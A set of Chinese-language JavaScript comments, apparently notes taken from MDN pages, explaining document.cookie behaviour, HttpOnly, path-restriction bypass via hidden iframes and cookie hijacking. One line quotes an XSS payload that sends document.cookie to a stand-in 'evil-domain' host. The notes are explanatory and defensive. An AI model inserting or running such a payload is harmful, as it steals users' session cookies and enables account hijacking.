// document.cookie 获取不到服务端设置的cookie
// document.cookie = '' 这样是删除不了 cookie的, 如果服务器设置 httpOnly为true时,只能通过http去修改(默认为true)
// https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies
// https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie

// 路径限制并不能阻止从其他路径访问cookie. 使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的iframe, 然后访问其 contentDocument.cookie 属性). 保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用同源策略保护其不被读取.

// Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击 -

// (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
// HttpOnly 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击. 参见 Cookies and Security.

// 备注
// 从 Firefox 2 起, 有更好的客户端存储机制用以替代 cookie - WHATWG DOM Storage.
// 你可以通过更新一个cookie的过期时间为0来删除一个cookie。
// 请注意, 更多/更大的 cookies 意味着每个请求都要包含更繁重的数据传输. 如果您只是需要存储些 "client-only" 的数据, 那么郑重建议您使用 WHATWG DOM Storage.

